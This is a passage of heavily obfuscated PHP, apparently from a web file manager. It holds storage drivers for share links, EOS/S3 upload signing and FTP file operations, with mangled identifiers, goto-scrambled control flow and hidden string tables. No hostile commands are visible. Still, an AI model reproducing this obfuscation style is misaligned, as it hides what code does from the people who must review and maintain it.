ActionApply($b¦°³¡ ½©, $fŒàßÍ†šº); $Bä¨ÜÛñ = ob_get_clean(); goto bïùÆ ìë¬; Fö§Ñ„¾±: } goto D±ªÏ§ò ò; F»‹¨³Ø¤: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($céêìàÆ‚è) { $this->pathParse = $céêìàÆ‚è; } protected function infoParse($fÚï§»É¦, $AÌ†¨ÌÆ¡ö = false) { $aÒ´ÏŸšŒÅ =& $_SERVER[´Ù×Íå‘ÄõÛ]; return Action($aÒ´ÏŸšŒÅ[1022])->sharePathInfo($this->pathParse[$aÒ´ÏŸšŒÅ[75]], !0, $AÌ†¨ÌÆ¡ö); } public function listPath($A¢†„¬¢£‰, $dÕ‚§îµŒ¨ = false) { $e‚ª³Ôî‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $càÎËÒõÉ = IO::listPath($A¢†„¬¢£‰, $dÕ‚§îµŒ¨); foreach ($càÎËÒõÉ as $FÏ„Î®µìÄ => $d¥„Ş“½ã) { if (!in_array($FÏ„Î®µìÄ, array($e‚ª³Ôî‡[73], $e‚ª³Ôî‡[74]))) { continue; } foreach ($d¥„Ş“½ã as $c÷“ôƒøñ¼ => $aĞ”Ó‹Ÿ) { $aĞ”Ó‹Ÿ = Action($e‚ª³Ôî‡[1137])->parsePathChildren($aĞ”Ó‹Ÿ, array($e‚ª³Ôî‡[387] => $A¢†„¬¢£‰)); $càÎËÒõÉ[$FÏ„Î®µìÄ][$c÷“ôƒøñ¼] = Action($e‚ª³Ôî‡[1022])->shareItemInfo($aĞ”Ó‹Ÿ); } } return $càÎËÒõÉ; } public function listAll($bª×­ˆ‰) { $Dƒº®äÁ“Ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d¶È³ñŠ© = IO::listAll($bª×­ˆ‰); foreach ($d¶È³ñŠ© as &$EÄÅÛÒÍˆ§) { $EÄÅÛÒÍˆ§ = array_merge(IO::info($EÄÅÛÒÍˆ§[$Dƒº®äÁ“Ï[75]]), $EÄÅÛÒÍˆ§); $EÄÅÛÒÍˆ§[$Dƒº®äÁ“Ï[391]] = Action($Dƒº®äÁ“Ï[1022])->shareItemInfo($EÄÅÛÒÍˆ§); } return $d¶È³ñŠ©; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($BÕ¥àãÉÂ) { parent::__construct($BÕ¥àãÉÂ); $this->signatureVersion($_SERVER[´Ù×Íå‘ÄõÛ][200]); } public function uploadFormData($e‡Ü®ì²°Í, $E’Ÿ “ëÕ± = 3600) { goto cƒÍÂˆ­„; E–ãÈ«Ò·å: $dÊÀ¾æ‚Ä = base64_encode(json_encode($d¦ä…Ş­É)); $eÑ¾…º›µ = hash_hmac($eÜ‹¥Ï¦ïì[1148], $AÊáë¥†Õ¸, $eÜ‹¥Ï¦ïì[1149] . $this->secret, !0); $f¡Ñëô—î = hash_hmac($eÜ‹¥Ï¦ïì[1148], $this->region, $eÑ¾…º›µ, !0); goto dË£¿¾¥ï„; dË£¿¾¥ï„: $f‚™§ÛñÀ· = hash_hmac($eÜ‹¥Ï¦ïì[1148], $E¦ßƒ°àéİ, $f¡Ñëô—î, !0); $cÀ¦İê›‚ = hash_hmac($eÜ‹¥Ï¦ïì[1148], $e«çëõ…‡Û, $f‚™§ÛñÀ·, !0); $ešá´¿®Ìí = hash_hmac($eÜ‹¥Ï¦ïì[1148], $dÊÀ¾æ‚Ä, $cÀ¦İê›‚); goto eÑÅÖğŸƒ; dàÅ¼îÑƒ¡: $e«çëõ…‡Û = $eÜ‹¥Ï¦ïì[1140]; $cº¢ØéÖ = $E’Ÿ “ëÕ± . $eÜ‹¥Ï¦ïì[33]; $D°»Ù¹µÑ = $eÜ‹¥Ï¦ïì[1104]; goto CÍá³ÇŒ‰‚; eÑÅÖğŸƒ: $D²Æí©‰¥ = array($eÜ‹¥Ï¦ïì[199] => $eÜ‹¥Ï¦ïì[33], $eÜ‹¥Ï¦ïì[1150] => $eÜ‹¥Ï¦ïì[33], $eÜ‹¥Ï¦ïì[1108] => $f¤«˜ñï›Ö, $eÜ‹¥Ï¦ïì[1112] => $D°»Ù¹µÑ, $eÜ‹¥Ï¦ïì[1116] => $dÊÀ¾æ‚Ä, $eÜ‹¥Ï¦ïì[1151] => $d¹“ÅÚÆÈÅ, $eÜ‹¥Ï¦ïì[1152] => $c±‚Ú±…†Ò, $eÜ‹¥Ï¦ïì[1153] => $f†ãÁ´‚«, $eÜ‹¥Ï¦ïì[1154] => $cº¢ØéÖ, $eÜ‹¥Ï¦ïì[1155] => $ešá´¿®Ìí, $eÜ‹¥Ï¦ïì[169] => $this->getHost()); return $D²Æí©‰¥; goto e¬°ë¯šİÊ; CÍá³ÇŒ‰‚: $A±“¥ŞÈ¨ƒ = array($this->accessKey, $AÊáë¥†Õ¸, $this->region, $E¦ßƒ°àéİ, $e«çëõ…‡Û); $d¹“ÅÚÆÈÅ = implode($eÜ‹¥Ï¦ïì[8], $A±“¥ŞÈ¨ƒ); $d¦ä…Ş­É = array($eÜ‹¥Ï¦ïì[1106] => gmdate($eÜ‹¥Ï¦ïì[1105], strtotime($eÜ‹¥Ï¦ïì[1141])), $eÜ‹¥Ï¦ïì[1107] => array(array($eÜ‹¥Ï¦ïì[1109] => $this->bucket), array($eÜ‹¥Ï¦ïì[1108] => $f¤«˜ñï›Ö), array($eÜ‹¥Ï¦ïì[1110], $eÜ‹¥Ï¦ïì[1111], $eÜ‹¥Ï¦ïì[33]), array($eÜ‹¥Ï¦ïì[1110], $eÜ‹¥Ï¦ïì[1142], $eÜ‹¥Ï¦ïì[33]), array($eÜ‹¥Ï¦ïì[1110], $eÜ‹¥Ï¦ïì[1143], $eÜ‹¥Ï¦ïì[33]), array($eÜ‹¥Ï¦ïì[1112] => $D°»Ù¹µÑ), array($eÜ‹¥Ï¦ïì[1144] => $d¹“ÅÚÆÈÅ), array($eÜ‹¥Ï¦ïì[1145] => $c±‚Ú±…†Ò), array($eÜ‹¥Ï¦ïì[1146] => $f†ãÁ´‚«), array($eÜ‹¥Ï¦ïì[1147] => $cº¢ØéÖ))); goto E–ãÈ«Ò·å; aØº‰‹¾¦: $E¦ßƒ°àéİ = $eÜ‹¥Ï¦ïì[59]; $f†ãÁ´‚« = gmdate($eÜ‹¥Ï¦ïì[1139]); $AÊáë¥†Õ¸ = gmdate($eÜ‹¥Ï¦ïì[691]); goto dàÅ¼îÑƒ¡; cƒÍÂˆ­„: $eÜ‹¥Ï¦ïì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¤«˜ñï›Ö = $eÜ‹¥Ï¦ïì[185]; $c±‚Ú±…†Ò = $eÜ‹¥Ï¦ïì[1138]; goto aØº‰‹¾¦; e¬°ë¯šİÊ: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($D£¢í¸­) { parent::__construct(); if (count($D£¢í¸­) > 0) { $this->_init($D£¢í¸­); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($f×ŞÓ àŠ) { $dÌ»îé”ó± =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $config; $this->appCharset = $config[$dÌ»îé”ó±[1156]]; $this->systemCharset = $config[$dÌ»îé”ó±[1157]]; if (isset($f×ŞÓ àŠ[$dÌ»îé”ó±[1158]]) && $f×ŞÓ àŠ[$dÌ»îé”ó±[1158]]) { $this->systemCharset = $f×ŞÓ àŠ[$dÌ»îé”ó±[1158]]; } } public function iconvApp($DÃãÒ„Œæ¥) { return $this->iconvTo($DÃãÒ„Œæ¥, $this->systemCharset, $this->appCharset); } public function iconvSystem($d¼‡”Åîˆƒ) { return $this->iconvTo($d¼‡”Åîˆƒ, $this->appCharset, $this->systemCharset); } public function getPathOuter($a»‡›ÏÑ) { goto b÷“ƒº‹®µ; e–éÓ‚ˆ: if (substr($d…´–‡ˆŸã, 0, 2) == $bğµØ¿©è[1159]) { $d…´–‡ˆŸã = BASIC_PATH . substr($d…´–‡ˆŸã, 2); } if (substr($a»‡›ÏÑ, 0, 2) == $bğµØ¿©è[1159]) { $a»‡›ÏÑ = BASIC_PATH . substr($a»‡›ÏÑ, 2); } $d…´–‡ˆŸã = KodIO::clear($d…´–‡ˆŸã); goto E¬•‡×®Şˆ; aÖİÒøŒï: return $this->pathDriver . $bğµØ¿©è[8] . ltrim($a»‡›ÏÑ, $bğµØ¿©è[8]); goto F–ÈÙŞí„Ü; E¬•‡×®Şˆ: $a»‡›ÏÑ = KodIO::clear($a»‡›ÏÑ); $a»‡›ÏÑ = substr($a»‡›ÏÑ, strlen($d…´–‡ˆŸã)); if (empty($this->pathDriver)) { return $a»‡›ÏÑ; } goto aÖİÒøŒï; b÷“ƒº‹®µ: $bğµØ¿©è =& $_SERVER[´Ù×Íå‘ÄõÛ]; $d…´–‡ˆŸã = $this->iconvApp($this->pathBase); $a»‡›ÏÑ = $this->iconvApp($a»‡›ÏÑ); goto e–éÓ‚ˆ; F–ÈÙŞí„Ü: } private function _init($a—ÌóÀµô› = array()) { $a‡è…ÌÃá =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!function_exists($a‡è…ÌÃá[1160])) { show_json(LNG($a‡è…ÌÃá[1161]), !1); } $this->config = $a—ÌóÀµô›; $this->charsetReset($a—ÌóÀµô›); foreach ($a—ÌóÀµô› as $C«¬Şğ—ô => $A¦àİíá‹Ä) { if (isset($this->{$C«¬Şğ—ô})) { $this->{$C«¬Şğ—ô} = $A¦àİíá‹Ä; } } return $this->_login($a—ÌóÀµô›); } private function _login($b´ƒŒ°£‡›) { goto c‹ÏİˆÓåÒ; eÓÊñìê: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $E¦·ğêÃÒŸ = $this->pasv == $bÂŠÆÙÛÏ[83] ? !0 : !1; @ftp_pasv($this->connect, $E¦·ğêÃÒŸ); goto CÇåÍ„®Á„; c‹ÏİˆÓåÒ: $bÂŠÆÙÛÏ =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $b«ÏŒÒ¶¡¬ = array(); $eÁªÁÍ÷ä = md5(json_encode($b´ƒŒ°£‡›)); goto dÂªÊëŞæÎ; dÂªÊëŞæÎ: if (isset($b«ÏŒÒ¶¡¬[$eÁªÁÍ÷ä])) { foreach ($b«ÏŒÒ¶¡¬[$eÁªÁÍ÷ä] as $BÊµ²•–˜Ø => $b½–‡¿ÕÓ) { $this->{$BÊµ²•–˜Ø} = $b½–‡¿ÕÓ; } return !0; } $BêÃ£ˆ²‘ƒ = parse_url(trim($this->server, $bÂŠÆÙÛÏ[8])); $this->host = $BêÃ£ˆ²‘ƒ[$bÂŠÆÙÛÏ[169]]; goto CÄŞ…ÂÅØÀ; CÄŞ…ÂÅØÀ: $DƒÁŞ§Øäù = isset($BêÃ£ˆ²‘ƒ[$bÂŠÆÙÛÏ[168]]) && $BêÃ£ˆ²‘ƒ[$bÂŠÆÙÛÏ[168]] == $bÂŠÆÙÛÏ[1162] ? !0 : !1; $this->scheme = $DƒÁŞ§Øäù ? $bÂŠÆÙÛÏ[1163] : $bÂŠÆÙÛÏ[1164]; $this->port = isset($BêÃ£ˆ²‘ƒ[$bÂŠÆÙÛÏ[170]]) ? $BêÃ£ˆ²‘ƒ[$bÂŠÆÙÛÏ[170]] : 21; goto a£ßºæé¹; CÇåÍ„®Á„: $b«ÏŒÒ¶¡¬[$eÁªÁÍ÷ä] = array($bÂŠÆÙÛÏ[1165] => $this->connect, $bÂŠÆÙÛÏ[169] => $this->host, $bÂŠÆÙÛÏ[168] => $this->scheme, $bÂŠÆÙÛÏ[170] => $this->port); return $b¨²ƒ´Úæ¹; goto c¡–Óàéºî; a£ßºæé¹: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $b¨²ƒ´Úæ¹ = @ftp_login($this->connect, $this->username, $this->userpass); goto eÓÊñìê; c¡–Óàéºî: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($B¾Ë‡º£ïÁ, $AÓº²­Çº¢ = '', $A÷éä­½…š = REPEAT_RENAME) { if ($this->setContent($B¾Ë‡º£ïÁ, $AÓº²­Çº¢)) { return $this->getPathOuter($B¾Ë‡º£ïÁ); } return !1; } public function mkdir($cÍÁè‘ä—‘, $C› ”«å© = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $cÍÁè‘ä—‘ = $this->iconvSystem($cÍÁè‘ä—‘); if ($this->isFolder($cÍÁè‘ä—‘) || @ftp_mkdir($this->connect, $cÍÁè‘ä—‘)) { return $this->getPathOuter($cÍÁè‘ä—‘); } if (!$this->mkdir($this->pathFather($cÍÁè‘ä—‘))) { return !1; } if ($cÍÁè‘ä—‘ = @ftp_mkdir($this->connect, $cÍÁè‘ä—‘)) { return $this->getPathOuter($cÍÁè‘ä—‘); } return !1; } public function copyFile($EÍºÓéì…–, $f¶®¨ˆœŞ¦) { goto Cğ˜•›®¡; aà®’ÂÖî¦: $this->tempFileRemve($fòˆí¤·ÓŠ); return $b˜Æ‰§Á‘È; goto cŞÈÆ«åƒ„; c¥Õ½‰ô¥ƒ: $D®Ö¸©ï½Ô = $this->iconvApp($fòˆí¤·ÓŠ); $this->download($EÍºÓéì…–, $D®Ö¸©ï½Ô); $b˜Æ‰§Á‘È = $this->upload($f¶®¨ˆœŞ¦, $D®Ö¸©ï½Ô); goto aà®’ÂÖî¦; Cğ˜•›®¡: if (!$this->_isconn()) { return !1; } $aŒ®Õäõêš = $this->pathThis($this->iconvSystem($EÍºÓéì…–)); $fòˆí¤·ÓŠ = $this->tempFile($aŒ®Õäõêš); goto c¥Õ½‰ô¥ƒ; cŞÈÆ«åƒ„: } public function moveFile($B»Ú‰ÄøÂ¡, $CËöÙƒê£Ë) { if (!$this->_isconn()) { return !1; } $B»Ú‰ÄøÂ¡ = $this->iconvSystem($B»Ú‰ÄøÂ¡); $CËöÙƒê£Ë = $this->iconvSystem($CËöÙƒê£Ë); $C˜¯«‡¥‰ë = @ftp_rename($this->connect, $B»Ú‰ÄøÂ¡, $CËöÙƒê£Ë); return $C˜¯«‡¥‰ë ? $this->getPathOuter($CËöÙƒê£Ë) : !1; } public function delFile($cƒ·†ƒ†˜ß) { if (!$this->_isconn()) { return !1; } $cƒ·†ƒ†˜ß = $this->iconvSystem($cƒ·†ƒ†˜ß); return @ftp_delete($this->connect, $cƒ·†ƒ†˜ß); } public function delFolder($Eù—Ï®Úí) { if (!$this->_isconn()) { return !1; } $Eù—Ï®Úí = $this->iconvSystem($Eù—Ï®Úí); $a‡¢–¿—ù¦ = $this->ftpList($Eù—Ï®Úí); if (!$a‡¢–¿—ù¦) { return @ftp_rmdir($this->connect, $Eù—Ï®Úí); } foreach ($a‡¢–¿—ù¦ as $eš˜Ò«å´×) { if ($this->isFolder($eš˜Ò«å´×)) { $eš˜Ò«å´× = $this->iconvApp($eš˜Ò«å´×); $this->delFolder($eš˜Ò«å´×); } else { @ftp_delete($this->connect, $eš˜Ò«å´×); } } return @ftp_rmdir($this->connect, $Eù—Ï®Úí); } public function rename($b—·á‘ğã, $fã†ËÃ–) { goto BÚÁÍ×›óŒ; BÚÁÍ×›óŒ: $eÊ‡Óß«ßä =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->_isconn()) { return !1; } $C˜ÈÊ·¿ô— = $this->fileNameAuto($this->pathFather($b—·á‘ğã), $fã†ËÃ–); goto d¸®¤–¦; bëÈö”ÜÊ: return $Eßİî·‹å ? $this->getPathOuter($BÜÌÂ §åß) : !1; goto dÃ‘’…ÃÔ; d¸®¤–¦: $C˜ÈÊ·¿ô— = $this->iconvSystem($C˜ÈÊ·¿ô—); $b—·á‘ğã = $this->iconvSystem($b—·á‘ğã); $BªÊ•ö‡¾ = $this->pathFather($b—·á‘ğã); goto cÜ¶ñÛñ; cÜ¶ñÛñ: $BÜÌÂ §åß = rtrim($BªÊ•ö‡¾, $eÊ‡Óß«ßä[8]) . $eÊ‡Óß«ßä[8] . $C˜ÈÊ·¿ô—; $Eßİî·‹å = @ftp_rename($this->connect, $b—·á‘ğã, $BÜÌÂ §åß); $BÜÌÂ §åß = $this->iconvApp($BÜÌÂ §åß); goto bëÈö”ÜÊ; dÃ‘’…ÃÔ: } private function folderInfo($d¦ƒ¨³öœÙ, $eÚƒğŞ¬Ÿ = false) { goto a¸¤áõµ†; aÃ—Ş¬‘: $BÚã«ôÊï¼ = $this->iconvSystem($d¦ƒ¨³öœÙ); if ($eÚƒğŞ¬Ÿ) { return array($Cš¯’‘øÆÖ[28] => $bÑ…³±Í, $Cš¯’‘øÆÖ[75] => $C©ŠŒ®ŒŒ, $Cš¯’‘øÆÖ[29] => $Cš¯’‘øÆÖ[76]); } $aõ½È¼¯ñŞ = array($Cš¯’‘øÆÖ[28] => $bÑ…³±Í, $Cš¯’‘øÆÖ[75] => $C©ŠŒ®ŒŒ, $Cš¯’‘øÆÖ[29] => $Cš¯’‘øÆÖ[76], $Cš¯’‘øÆÖ[187] => 0, $Cš¯’‘øÆÖ[107] => 0, $Cš¯’‘øÆÖ[1166] => !0, $Cš¯’‘øÆÖ[1167] => !0); goto b„ÇöáÔ®¥; b„ÇöáÔ®¥: return $aõ½È¼¯ñŞ; goto eÃ‚ ˆ‰; a¸¤áõµ†: $Cš¯’‘øÆÖ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C©ŠŒ®ŒŒ = $this->getPathOuter(rtrim($d¦ƒ¨³öœÙ, $Cš¯’‘øÆÖ[8])); $bÑ…³±Í = $this->pathThis($C©ŠŒ®ŒŒ); goto aÃ—Ş¬‘; eÃ‚ ˆ‰: } private function fileInfo($b­ÍòÊ¨, $A‘Äª¿Ñª = false) { goto cÔƒ¥Ñ¤; a©ØŞÛ”Ùì: $b„Á•™½èå[$C­ºÖ¹†ÕÆ[107]] = $b„Á•™½èå[$C­ºÖ¹†ÕÆ[107]] > 0 ? $b„Á•™½èå[$C­ºÖ¹†ÕÆ[107]] : 0; return $b„Á•™½èå; goto Eù‡´¹·¸; cÔƒ¥Ñ¤: $C­ºÖ¹†ÕÆ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C‹¿Æ˜“³ = $this->getPathOuter(rtrim($b­ÍòÊ¨, $C­ºÖ¹†ÕÆ[8])); $cÃìÑòËë = $this->pathThis($C‹¿Æ˜“³); goto d‰àéÚï·ß; d‰àéÚï·ß: $c‚ÙŞ£ËÕ„ = $this->iconvSystem($b­ÍòÊ¨); if ($A‘Äª¿Ñª) { return array($C­ºÖ¹†ÕÆ[28] => $cÃìÑòËë, $C­ºÖ¹†ÕÆ[75] => $C‹¿Æ˜“³, $C­ºÖ¹†ÕÆ[29] => $C­ºÖ¹†ÕÆ[167], $C­ºÖ¹†ÕÆ[160] => $this->ext($b­ÍòÊ¨), $C­ºÖ¹†ÕÆ[77] => $this->size($b­ÍòÊ¨)); } $b„Á•™½èå = array($C­ºÖ¹†ÕÆ[28] => $cÃìÑòËë, $C­ºÖ¹†ÕÆ[75] => $C‹¿Æ˜“³, $C­ºÖ¹†ÕÆ[29] => $C­ºÖ¹†ÕÆ[167], $C­ºÖ¹†ÕÆ[187] => 0, $C­ºÖ¹†ÕÆ[107] => @ftp_mdtm($this->connect, $c‚ÙŞ£ËÕ„), $C­ºÖ¹†ÕÆ[160] => $this->ext($b­ÍòÊ¨), $C­ºÖ¹†ÕÆ[77] => $this->size($b­ÍòÊ¨), $C­ºÖ¹†ÕÆ[1166] => !0, $C­ºÖ¹†ÕÆ[1167] => !0); goto a©ØŞÛ”Ùì; Eù‡´¹·¸: } public function size($Cå…ˆ¢İ·) { $e…´¾Ä‹³Á = $this->objectMeta($Cå…ˆ¢İ·); return $e…´¾Ä‹³Á ? $e…´¾Ä‹³Á[$_SERVER[´Ù×Íå‘ÄõÛ][77]] : 0; } public function info($e¦“˜…¡‡Ü) { if ($this->isFile($e¦“˜…¡‡Ü)) { return $this->fileInfo($e¦“˜…¡‡Ü, 0); } else { if ($this->isFolder($e¦“˜…¡‡Ü)) { return $this->folderInfo($e¦“˜…¡‡Ü); } } return !1; } public function exist($B‘öğ›¸åÇ) { return $this->objectMeta($B‘öğ›¸åÇ) ? !0 : !1; } public function isFile($CİõÎªêƒ) { $b¡£Šãîø =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b¹±Ï­°ˆ‚ = $this->objectMeta($CİõÎªêƒ); return $b¹±Ï­°ˆ‚ ? $b¹±Ï­°ˆ‚[$b¡£Šãîø[29]] == $b¡£Šãîø[167] : !1; } public function isFolder($eÈ³ñ†…) { $a“ßÆÑòœ¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B¦„Õßç¨º = $this->objectMeta($eÈ³ñ†…); return $B¦„Õßç¨º ? $B¦„Õßç¨º[$a“ßÆÑòœ¬[29]] == $a“ßÆÑòœ¬[76] : !1; } public function listPath($eìøĞÌ‘™«, $C—Ó†§ö³ª = false) { goto céÀ¹Š²; céÀ¹Š²: $a À¦œÆ‰Š =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->_isconn()) { return !1; } $eìøĞÌ‘™« = $this->iconvSystem($eìøĞÌ‘™«); goto d…ÄÆÅ£Ü²; C‚±¦è†ù: foreach ($bù˜¿ÓÚ as $eìøĞÌ‘™«) { if ($this->isFolder($eìøĞÌ‘™«)) { $fÌÆ©¯åò–[$a À¦œÆ‰Š[74]][] = $this->folderInfo($eìøĞÌ‘™«, $C—Ó†§ö³ª); } else { $fÌÆ©¯åò–[$a À¦œÆ‰Š[73]][] = $this->fileInfo($eìøĞÌ‘™«, $C—Ó†§ö³ª); } } return $fÌÆ©¯åò–; goto b­‡˜’“÷ª; d…ÄÆÅ£Ü²: $bù˜¿ÓÚ = $this->ftpList($eìøĞÌ‘™«); $fÌÆ©¯åò– = array($a À¦œÆ‰Š[74] => array(), $a À¦œÆ‰Š[73] => array()); if (!$bù˜¿ÓÚ) { return $fÌÆ©¯åò–; } goto C‚±¦è†ù; b­‡˜’“÷ª: } public function has($bÉ¶šæİ“Œ, $dñÂ¹Ííæ = false, $cŠ„ëÌ„Í = true) { goto c«©³øñ®Î; fĞ¿Ìµ˜­´: foreach ($f„â”º as $bÉ¶šæİ“Œ) { if ($cŠ„ëÌ„Í) { if (!$this->isFolder($bÉ¶šæİ“Œ)) { return !0; } } else { if ($this->isFolder($bÉ¶šæİ“Œ)) { return !0; } } } return !1; goto EŒœ»Ü»ó†; c«©³øñ®Î: $E™¢ Ìğœ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->_isconn()) { return !1; } $bÉ¶šæİ“Œ = $this->iconvSystem($bÉ¶šæİ“Œ); goto e Çó¤‡º·; e Çó¤‡º·: $f„â”º = $this->ftpList($bÉ¶šæİ“Œ); if (!$f„â”º) { return !1; } if ($dñÂ¹Ííæ) { return array($E™¢ Ìğœ[191] => 0, $E™¢ Ìğœ[192] => count($f„â”º)); } goto fĞ¿Ìµ˜­´; EŒœ»Ü»ó†: } public function listAll($A×÷­ÃêÇ) { goto bø¨ÆÌæÁ; bø¨ÆÌæÁ: $Dºì½Ô‚ÛË =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->_isconn()) { return !1; } $A×÷­ÃêÇ = $this->iconvSystem($A×÷­ÃêÇ); goto aË—…ªäï; aË—…ªäï: $cäÚ©ÔÍµÔ = array($Dºì½Ô‚ÛË[73] => array(), $Dºì½Ô‚ÛË[74] => array()); $this->recursionFtpFiles($A×÷­ÃêÇ, $cäÚ©ÔÍµÔ); $BŒŞ»¤™ÑÁ = array(); goto e…õù·‹¶; e…õù·‹¶: foreach ($cäÚ©ÔÍµÔ[$Dºì½Ô‚ÛË[74]] as $BºÂà‡šã¥) { $BŒŞ»¤™ÑÁ[] = array($Dºì½Ô‚ÛË[75] => $Dºì½Ô‚ÛË[8] . trim(str_replace($A×÷­ÃêÇ, $Dºì½Ô‚ÛË[33], $BºÂà‡šã¥), $Dºì½Ô‚ÛË[8]) . $Dºì½Ô‚ÛË[8], $Dºì½Ô‚ÛË[76] => 1, $Dºì½Ô‚ÛË[77] => 0); } foreach ($cäÚ©ÔÍµÔ[$Dºì½Ô‚ÛË[73]] as $dÇ½›ö·ªÁ) { $BŒŞ»¤™ÑÁ[] = array($Dºì½Ô‚ÛË[75] => $Dºì½Ô‚ÛË[8] . trim(str_replace($A×÷­ÃêÇ, $Dºì½Ô‚ÛË[33], $dÇ½›ö·ªÁ), $Dºì½Ô‚ÛË[8]), $Dºì½Ô‚ÛË[76] => 0, $Dºì½Ô‚ÛË[77] => $this->size($dÇ½›ö·ªÁ)); } return $BŒŞ»¤™ÑÁ; goto AÈù›ä†„; AÈù›ä†„: } public function getContent($dª˜È¶á¡‹) { if (!$this->_isconn()) { return !1; } $dª˜È¶á¡‹ = $this->iconvSystem($dª˜È¶á¡‹); return $this->fileSubstr($dª˜È¶á¡‹); } public function setContent($Cøåîö©º, $c¼³¦ Õçë = '') { goto bğİ„Ü„õã; Fä”¼‚¸å: file_put_contents($Fæ¬ÜÓÄ×, $c¼³¦ Õçë); $bäß£ëÛ¥ = $this->upload($Cøåîö©º, $this->iconvApp($Fæ¬ÜÓÄ×)); $this->tempFileRemve($Fæ¬ÜÓÄ×); goto b¨ĞÆ›ÜÄ; b¨ĞÆ›ÜÄ: return $bäß£ëÛ¥; goto Bİ”ª‹›Æ»; bğİ„Ü„õã: if (!$this->_isconn()) { return !1; } $F“ªù÷ÂÅº = $this->pathThis($this->iconvSystem($Cøåîö©º)); $Fæ¬ÜÓÄ× = $this->tempFile($F“ªù÷ÂÅº); goto Fä”¼‚¸å; Bİ”ª‹›Æ»: } public function fileSubstr($EÏ±µ‹øÛ‡, $d“‚–•Úñô = 0, $f¸Œ±ßº‘‚ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($EÏ±µ‹øÛ‡, $d“‚–•Úñô, $f¸Œ±ßº‘‚); } private function ftpRequest($a¶Íí¤„†, $aá¸ÄÙš°½ = 0, $F“ïÉ–‡¹é = false) { goto FÀ—Öóßé; d¤ÏÁ×˜†‹: curl_setopt($Eˆñ¨öÏ©, CURLOPT_URL, $fÀÂ¢°×ÍØ . $this->pathEncode($a¶Íí¤„†)); curl_setopt($Eˆñ¨öÏ©, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($F“ïÉ–‡¹é) { $Aº‘Ôø‰ô¹ = $aá¸ÄÙš°½ + $F“ïÉ–‡¹é - 1; curl_setopt($Eˆñ¨öÏ©, CURLOPT_RANGE, "{$aá¸ÄÙš°½}\x2d{$Aº‘Ôø‰ô¹}"); } goto E™å©Ø¨†; E™å©Ø¨†: curl_setopt($Eˆñ¨öÏ©, CURLOPT_RETURNTRANSFER, 1); $A‰Ä²‡¢ = curl_exec($Eˆñ¨öÏ©); curl_close($Eˆñ¨öÏ©); goto dÁ‡ò“‹; FÀ—Öóßé: $a¶Íí¤„† = $this->iconvSystem($a¶Íí¤„†); $fÀÂ¢°×ÍØ = $this->scheme . $this->host . $_SERVER[´Ù×Íå‘ÄõÛ][4] . $this->port; $Eˆñ¨öÏ© = curl_init(); goto d¤ÏÁ×˜†‹; dÁ‡ò“‹: return $A‰Ä²‡¢; goto dÕô¹ìÔĞÏ; dÕô¹ìÔĞÏ: } public function upload($D‹ ‚Å…™‹, $D˜ó’ó¥, $d‚ÊÃ”ÙÉ§ = false, $a’ïó°Áãë = REPEAT_REPLACE) { goto fµÑ…´Ê¸¹; fµÑ…´Ê¸¹: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($D‹ ‚Å…™‹))) { return !1; } $D‹ ‚Å…™‹ = $this->iconvSystem($D‹ ‚Å…™‹); goto Fï£”Îëìà; F—ŞÈæ»Å: if ($F¶ÂÑ°œƒ™ != FTP_FINISHED) { return !1; } return $this->getPathOuter($D‹ ‚Å…™‹); goto c°Ó¨¾Ç‰; Fï£”Îëìà: $D˜ó’ó¥ = $this->iconvSystem($D˜ó’ó¥); $F¶ÂÑ°œƒ™ = ftp_nb_put($this->connect, $D‹ ‚Å…™‹, $D˜ó’ó¥, FTP_BINARY); while ($F¶ÂÑ°œƒ™ == FTP_MOREDATA) { $F¶ÂÑ°œƒ™ = ftp_nb_continue($this->connect); } goto F—ŞÈæ»Å; c°Ó¨¾Ç‰: } public function download($Cô÷½Â¾È, $bšÏÒ®ÙË« = '') { goto Dİ«â‘ÈéÒ; d¾Ü¦ÇÖÜ…: while ($Fİï¶¼Şç† == FTP_MOREDATA) { $Fİï¶¼Şç† = ftp_nb_continue($this->connect); } if ($Fİï¶¼Şç† != FTP_FINISHED) { return !1; } return $this->iconvApp($bšÏÒ®ÙË«); goto FíßÏÚ¼÷Å; Dİ«â‘ÈéÒ: if (!$this->_isconn()) { return !1; } $cÍ°óõËŸ = $this->pathFather($bšÏÒ®ÙË«); if (!IO::mkdir($cÍ°óõËŸ)) { return !1; } goto b¦öîÛÇ‚; b¦öîÛÇ‚: $Cô÷½Â¾È = $this->iconvSystem($Cô÷½Â¾È); $bšÏÒ®ÙË« = $this->iconvSystem($bšÏÒ®ÙË«); $Fİï¶¼Şç† = ftp_nb_get($this->connect, $bšÏÒ®ÙË«, $Cô÷½Â¾È, FTP_BINARY); goto d¾Ü¦ÇÖÜ…; FíßÏÚ¼÷Å: } private function ftpList($a¤¥®¢ÖÁÒ) { goto cÄÄÒ®îœ¬; A¯êâ§»²Û: $cë×­®’Ã = array_diff($cë×­®’Ã, array($DÅŸœŸÊÈÈ[91], $DÅŸœŸÊÈÈ[1169], $a¤¥®¢ÖÁÒ . 